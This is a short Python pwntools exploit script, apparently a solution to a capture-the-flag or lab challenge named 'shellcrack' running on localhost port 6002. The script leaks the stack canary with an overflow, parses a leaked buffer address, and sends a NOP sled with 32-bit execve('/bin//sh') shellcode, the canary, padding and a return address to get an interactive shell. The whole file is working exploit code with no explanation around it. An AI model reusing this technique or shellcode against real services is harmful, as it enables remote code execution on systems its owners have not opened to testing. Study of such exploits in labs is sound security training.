#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 6002

leak_payload = "a"*15 + "\n"
leak_payload = leak_payload[:-1]

c = remote(host, port)
#c = process('../shellcrack')
#gdb.attach(c)

c.recvline()

print("Sending payload to leak canary...")
c.sendline(leak_payload)

c.recvline()

leak = c.recvline()
leak = leak[:8]
print("Leaked Canary: %s" % (leak))

reply = c.recvline()
print(reply)
address = re.search('0x(.{8})', reply).group(0)
print("Buffer Address: %s" % (address))
address = int(address, 0)
address = p32(address)

payload = "\x90"*25
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += leak
#payload += cyclic(1000)
offset = cyclic_find(0x61616166)
payload += "a"*offset
payload += address

c.sendline(payload)

c.interactive()
